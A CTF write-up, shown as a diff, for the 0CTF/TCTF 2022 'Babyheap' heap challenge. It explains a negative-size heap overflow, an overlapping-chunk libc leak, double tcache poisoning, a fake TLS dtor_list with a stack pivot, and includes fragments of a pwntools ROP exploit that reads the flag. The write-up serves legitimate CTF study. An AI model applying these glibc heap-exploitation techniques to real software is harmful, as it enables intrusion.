@@ -1,3 +1,101 @@
+### Babyheap
+
+was a pwn challenge from 0CTF/TCTF 2022 edition
+
+This challenge is typical note app with vuln.
+
+A heap challenge based on libc-2.35 , last ubuntu 22.04 libc at the time of writing..
+
+so no hooks..
+
+classic menu from early classical ctf period..
+![heap](https://github.com/nobodyisnobody/write-ups/raw/main/0CTF.TCTF.2022/pwn/babyheap/pics/menu.png)
+
+The program has a seccomp in place, that limit us to open/read/write ROP, no execve..so no one-gadgets too..
+![seccomp](https://github.com/nobodyisnobody/write-ups/raw/main/0CTF.TCTF.2022/pwn/babyheap/pics/seccomp.png)
+
+### Bug
+Bug is at `Update` function below. We can pass negative value to this `Size` and earn almost unlimited heap overflow.
+
+```c
+  else {
+    printf("Size: ");
+    lVar2 = r_get_int();
+    if (*(long *)(param_1 + (long)(int)uVar1 * 0x18 + 8) < lVar2) {
+      puts("Invalid Size");
+    }
+    else {
+      printf("Content: ");
+      get_bytes(*(undefined8 *)(param_1 + (long)(int)uVar1 * 0x18 + 0x10),lVar2);
+      printf("Chunk %d Updated\n",(ulong)uVar1);
+    }
+  }
+  return;
+```
+
+### Exploit: leak
+Since no UAF & null terminated inputs, we chose to create overlap chunk to get leak. The plan is as follows.
+1. Arrange the chunks as below.
+2. Free #4 to consolidate chunk with #1
+3. Alloc some chunks to overlap main_arena's address and #3
+4. free #6 to chain unsortedbin for heap leak
+5. view #2 to leak libc + heap
+
+```
+Chunk #0    [ALLOC] <-- to edit #1 header
+Chunk #1    [FREE ] <-- unsortedbin with fake header
+Chunk #2    [ALLOC] <-- for leak
+Chunk #3    [ALLOC] <-- for tcache poisoning
+Chunk #4    [ALLOC] <-- make prev inuse: false
+Chunk #5    [ALLOC] <-- guard chunk
+Chunk #6    [ALLOC] <-- bigger than 0x420
+Chunk #7    [ALLOC] <-- guard chunk
+Chunk #8-15 [FREE ] <-- fill tcache
+```
+
+### Exploit: do the tcache poisonning dance two times..
+
+So for exploitation we will use a classical tcache poisonning attack, wich is easy with heap overflow.
+
+We just have to free at least 2 chunks… then overwrite their fd pointer with the heap overflow.
+
+We will reuse the same method to achieve code execution than in ezvm challenge from this ctf.
+
+https://github.com/nobodyisnobody/write-ups/tree/main/0CTF.TCTF.2022/pwn/ezvm
+
+We will create a fake `dtor_list` table in tls-storage zone just before libc.
+
+the `call_tls_dtors()` will also permit us to set `rdx` register,
+
+we will use a very usefull gadget in libc, to pivot stack on rdx
+
+```
+libc.address + 0x000000000005a170 # mov rsp, rdx ; ret
+```
+
+instead of calling system like in ezvm challenge , we will setup rdx to point to our rop,
+
+and will call the `mov rsp,rdx` gadget with out fake `dtor_list` table
+
+our ROP is a classic open / read / write rop
+
+that will dump the flag.
+
+For using this method ,we need two writes:
+
+- one to erase the random value that is used for calculating mangled value as `fs:0x30`
+- another to write our fake `dtor_list` table and our rop
+
+so we will do tcache poisonning attack two times…
+
+then we exit the program, that will execute our rop at exit time…
+ and dump the flag.
+
+![gotflag](./pics/gotflag.png)
+
+here is the exploit code commented(more or less):
+
+```python
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 from pwn import *
@@ -145,7 +243,7 @@ syscall = libc.address + 0x0000000000091396 # syscall; ret;
 
 a(0xf8, b'a1a1')
 ropa = libc.address - 0x2890
-# our final rop that will dump the flag
+# our final ROP thant will dump the flag
 myrop= b''
 # open(fname,O_RDONLY)  (8 qwords)
 myrop += p64(0)+p64(pop_rdi)+p64(ropa+(29*8))+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
@@ -180,9 +278,11 @@ fake +=  p64(0xdeadbeef)        #
 fake +=  p64(libc.address - 0x2888)        #  arg goes in rdx , so address of our ROP where we pivot ideally ready on heap
 
 a(0x48, fake)
-
-# exit, and execute our rop so..
+# exit , so our rop will be executed
 r.sendlineafter(b'mand: ', b'5')
 
 r.interactive()
 r.close()
+```
+
+*nobodyisnobody still on the pwn side..*
